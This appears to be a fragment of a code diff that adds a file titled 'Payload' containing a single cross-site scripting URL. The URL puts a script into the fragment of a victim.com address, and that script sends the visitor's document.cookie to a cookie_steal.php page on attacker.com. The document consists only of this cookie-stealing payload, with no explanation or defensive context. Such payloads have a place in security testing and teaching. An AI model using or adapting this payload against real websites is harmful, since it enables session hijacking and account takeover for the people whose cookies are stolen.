@@ -1,0 +1,3 @@
+Payload
+--------------------------
+http://victim.com/#<script>document.location='http://attacker.com/cookie_steal.php?cookie='+document.cookie;</script>
